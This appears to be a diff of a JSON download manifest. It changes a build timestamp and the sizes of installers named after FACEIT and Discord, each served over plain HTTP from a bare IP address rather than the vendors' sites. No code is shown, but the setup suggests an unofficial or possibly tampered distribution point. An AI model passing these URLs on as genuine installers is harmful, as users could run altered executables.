@@ -1,9 +1,9 @@
 {
-  "built_at": 1794423174427,
+  "built_at": 1794423833348,
   "files": [
     {
       "name": "FACEITInstaller_64.exe",
-      "size": 115941088,
+      "size": 115940752,
       "url": "http://85.239.146.62:8099/files/FACEITInstaller_64.exe"
     },
     {
@@ -13,7 +13,7 @@
     },
     {
       "name": "DiscordSetup.exe",
-      "size": 167257936,
+      "size": 167258024,
       "url": "http://85.239.146.62:8099/files/DiscordSetup.exe"
     }
   ]
